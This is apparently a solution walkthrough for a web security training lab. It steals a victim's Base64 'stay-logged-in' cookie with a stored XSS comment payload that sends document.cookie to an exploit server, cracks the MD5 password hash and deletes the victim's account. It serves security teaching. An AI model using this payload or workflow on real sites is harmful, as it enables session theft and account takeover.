
Solution

1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the `stay-logged-in` cookie is Base64 encoded.
2. In the **Proxy > HTTP history** tab, go to the **Response** to your login request and highlight the `stay-logged-in` cookie, to see that it is constructed as follows:
    
    `username+':'+md5HashOfPassword`
3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
4. Go to the exploit server and make a note of the URL.
5. Go to one of the blogs and post a comment containing the following [stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored) payload, remembering to enter your own exploit server ID:
    
    `<script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>`
6. On the exploit server, open the access log. There should be a `GET` request from the victim containing their `stay-logged-in` cookie.
7. Decode the cookie in Burp Decoder. The result will be:
    
    `carlos:26323c16d5f4dabff3bb136f2460a943`
8. Copy the hash and paste it into a search engine. This will reveal that the password is `onceuponatime`.
9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.